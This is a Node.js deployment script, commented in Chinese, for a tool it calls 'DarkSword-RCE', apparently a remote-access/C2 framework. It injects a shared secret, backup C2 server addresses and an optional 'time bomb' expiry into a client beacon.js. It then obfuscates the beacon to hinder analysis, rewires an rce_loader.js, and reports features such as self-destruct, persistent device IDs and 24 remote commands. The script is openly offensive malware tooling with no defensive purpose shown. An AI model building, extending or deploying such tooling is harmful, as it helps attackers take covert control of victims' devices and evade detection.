#!/usr/bin/env node
/**
 * deploy_enhanced.js — 增强功能部署脚本
 * 
 * 用途：
 * 1. 验证环境变量配置
 * 2. 注入共享密钥到客户端代码
 * 3. 配置多 C2 服务器
 * 4. 可选：混淆客户端代码
 * 5. 生成部署摘要
 * 
 * 使用方法：
 *   node scripts/deploy_enhanced.js [--obfuscate]
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// 颜色输出
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
};

function log(msg, color = 'reset') {
  console.log(colors[color] + msg + colors.reset);
}

function error(msg) {
  log('❌ ' + msg, 'red');
}

function success(msg) {
  log('✅ ' + msg, 'green');
}

function warn(msg) {
  log('⚠️  ' + msg, 'yellow');
}

function info(msg) {
  log('ℹ️  ' + msg, 'blue');
}

// ═══════════════════════════════════════════════════════════════════════════
// 1. 验证环境变量
// ═══════════════════════════════════════════════════════════════════════════

function validateEnv() {
  info('验证环境变量配置...');
  
  const required = ['DS_USERNAME', 'DS_PASSWORD', 'DS_SHARED_SECRET'];
  const missing = required.filter(key => !process.env[key]);
  
  if (missing.length > 0) {
    error('缺少必需的环境变量: ' + missing.join(', '));
    console.log('\n请设置以下环境变量：');
    console.log('  export DS_USERNAME="admin"');
    console.log('  export DS_PASSWORD="$(openssl rand -base64 32)"');
    console.log('  export DS_SHARED_SECRET="$(openssl rand -hex 32)"');
    process.exit(1);
  }
  
  // 验证密钥强度
  const secret = process.env.DS_SHARED_SECRET;
  if (secret.length < 32) {
    warn('DS_SHARED_SECRET 长度较短（建议 ≥32 字符）');
  } else {
    success('DS_SHARED_SECRET 强度符合要求');
  }
  
  const password = process.env.DS_PASSWORD;
  if (password.length < 16) {
    warn('DS_PASSWORD 长度较短（建议 ≥16 字符）');
  } else {
    success('DS_PASSWORD 强度符合要求');
  }
  
  success('环境变量验证通过');
}

// ═══════════════════════════════════════════════════════════════════════════
// 2. 收集配置
// ═══════════════════════════════════════════════════════════════════════════

function collectConfig() {
  info('收集部署配置...');
  
  const config = {
    sharedSecret: process.env.DS_SHARED_SECRET,
    backupC2s: [
      process.env.DS_BACKUP_C2_1,
      process.env.DS_BACKUP_C2_2,
      process.env.DS_BACKUP_C2_3,
    ].filter(Boolean),
    expiryDate: process.env.DS_EXPIRY_DATE || '', // 格式: 2027-12-31T23:59:59Z
    obfuscate: process.argv.includes('--obfuscate'),
  };
  
  if (config.backupC2s.length > 0) {
    success(`配置了 ${config.backupC2s.length} 个备用 C2 服务器`);
    config.backupC2s.forEach((c2, i) => {
      console.log(`  C2 #${i + 2}: ${c2}`);
    });
  } else {
    warn('未配置备用 C2 服务器（建议至少配置 1 个）');
  }
  
  if (config.expiryDate) {
    const expiryTs = Date.parse(config.expiryDate);
    if (isNaN(expiryTs)) {
      warn('DS_EXPIRY_DATE 格式无效，将禁用时间炸弹');
      config.expiryDate = '';
    } else {
      success(`时间炸弹设置为: ${config.expiryDate}`);
    }
  } else {
    info('未设置时间炸弹（永不过期）');
  }
  
  return config;
}

// ═══════════════════════════════════════════════════════════════════════════
// 3. 注入配置到客户端代码
// ═══════════════════════════════════════════════════════════════════════════

function injectClientConfig(config) {
  info('注入配置到客户端代码...');
  
  const beaconPath = path.join(__dirname, '..', 'client', 'beacon.js');
  
  if (!fs.existsSync(beaconPath)) {
    error('未找到 beacon.js');
    process.exit(1);
  }
  
  let code = fs.readFileSync(beaconPath, 'utf8');
  
  // 1. 注入共享密钥
  code = code.replace(
    /const SHARED_SECRET = .*?;/,
    `const SHARED_SECRET = '${config.sharedSecret}';`
  );
  success('已注入共享密钥');
  
  // 2. 注入备用 C2 服务器
  if (config.backupC2s.length > 0) {
    const c2Array = config.backupC2s.map(url => `    '${url}',`).join('\n');
    code = code.replace(
      /const C2_URLS = \[\s*\(typeof localHost[^;]+;/s,
      `const C2_URLS = [\n    (typeof localHost !== 'undefined' ? localHost : location.origin),\n${c2Array}\n  ];`
    );
    success(`已注入 ${config.backupC2s.length} 个备用 C2`);
  }
  
  // 3. 注入时间炸弹
  if (config.expiryDate) {
    const expiryTs = Date.parse(config.expiryDate);
    code = code.replace(
      /const EXPIRY_TIMESTAMP = 0;/,
      `const EXPIRY_TIMESTAMP = ${expiryTs}; // ${config.expiryDate}`
    );
    success('已设置时间炸弹');
  }
  
  // 写回文件
  fs.writeFileSync(beaconPath, code, 'utf8');
  success('客户端配置注入完成');
  
  return beaconPath;
}

// ═══════════════════════════════════════════════════════════════════════════
// 4. 代码混淆（可选）
// ═══════════════════════════════════════════════════════════════════════════

function obfuscateClient(beaconPath) {
  info('执行代码混淆...');
  
  try {
    const { execSync } = require('child_process');
    
    // 检查 javascript-obfuscator 是否安装
    try {
      execSync('javascript-obfuscator --version', { stdio: 'ignore' });
    } catch {
      warn('未安装 javascript-obfuscator，跳过混淆');
      console.log('  安装命令: npm install -g javascript-obfuscator');
      return;
    }
    
    const outputPath = beaconPath.replace('.js', '.obf.js');
    const cmd = `javascript-obfuscator "${beaconPath}" \
      --compact true \
      --control-flow-flattening true \
      --control-flow-flattening-threshold 0.75 \
      --dead-code-injection true \
      --dead-code-injection-threshold 0.4 \
      --string-array true \
      --string-array-encoding base64 \
      --string-array-threshold 0.75 \
      --output "${outputPath}"`;
    
    execSync(cmd);
    success('代码混淆完成: ' + path.basename(outputPath));
    
    // 更新 rce_loader.js 中的引用（如果存在）
    const loaderPath = path.join(path.dirname(beaconPath), 'rce_loader.js');
    if (fs.existsSync(loaderPath)) {
      let loader = fs.readFileSync(loaderPath, 'utf8');
      if (loader.includes('beacon.js')) {
        loader = loader.replace(/beacon\.js/g, 'beacon.obf.js');
        fs.writeFileSync(loaderPath, loader, 'utf8');
        success('已更新 rce_loader.js 引用');
      }
    }
  } catch (e) {
    error('代码混淆失败: ' + e.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// 5. 生成部署摘要
// ═══════════════════════════════════════════════════════════════════════════

function generateSummary(config) {
  info('生成部署摘要...');
  
  const summary = {
    timestamp: new Date().toISOString(),
    version: '2.0-enhanced',
    features: [
      '✅ 多 C2 容错（' + (config.backupC2s.length + 1) + ' 个服务器）',
      '✅ AES-GCM 通信加密',
      '✅ 自毁机制',
      '✅ 持久化设备 ID（多重备份）',
      config.expiryDate ? '✅ 时间炸弹 (' + config.expiryDate + ')' : '⚪ 时间炸弹（未启用）',
      config.obfuscate ? '✅ 代码混淆' : '⚪ 代码混淆（未启用）',
    ],
    commands: 24, // 扩展到 24 条命令
    securityHash: crypto.createHash('sha256').update(config.sharedSecret).digest('hex').slice(0, 16),
  };
  
  const summaryPath = path.join(__dirname, '..', 'DEPLOYMENT_SUMMARY.json');
  fs.writeFileSync(summaryPath, JSON.stringify(summary, null, 2), 'utf8');
  success('部署摘要已保存: DEPLOYMENT_SUMMARY.json');
  
  console.log('\n' + '═'.repeat(60));
  log('部署完成摘要', 'magenta');
  console.log('═'.repeat(60));
  console.log('部署时间: ' + summary.timestamp);
  console.log('版本:     ' + summary.version);
  console.log('功能列表:');
  summary.features.forEach(f => console.log('  ' + f));
  console.log('命令总数: ' + summary.commands);
  console.log('密钥指纹: ' + summary.securityHash);
  console.log('═'.repeat(60) + '\n');
}

// ═══════════════════════════════════════════════════════════════════════════
// 主流程
// ═══════════════════════════════════════════════════════════════════════════

function main() {
  console.log('\n' + '═'.repeat(60));
  log('DarkSword-RCE 增强功能部署脚本', 'magenta');
  console.log('═'.repeat(60) + '\n');
  
  try {
    // 1. 验证环境
    validateEnv();
    console.log('');
    
    // 2. 收集配置
    const config = collectConfig();
    console.log('');
    
    // 3. 注入配置
    const beaconPath = injectClientConfig(config);
    console.log('');
    
    // 4. 混淆（可选）
    if (config.obfuscate) {
      obfuscateClient(beaconPath);
      console.log('');
    }
    
    // 5. 生成摘要
    generateSummary(config);
    
    log('\n🎉 部署成功！', 'green');
    console.log('\n下一步：');
    console.log('  1. 启动服务器: node server/admin_server.js');
    console.log('  2. 访问管理面板: http://localhost:' + (process.env.DS_PORT || '8888') + '/admin');
    console.log('  3. 查看完整文档: cat ENHANCEMENT_GUIDE.md\n');
    
  } catch (e) {
    error('\n部署失败: ' + e.message);
    console.error(e.stack);
    process.exit(1);
  }
}

// 运行
if (require.main === module) {
  main();
}

module.exports = { validateEnv, collectConfig, injectClientConfig };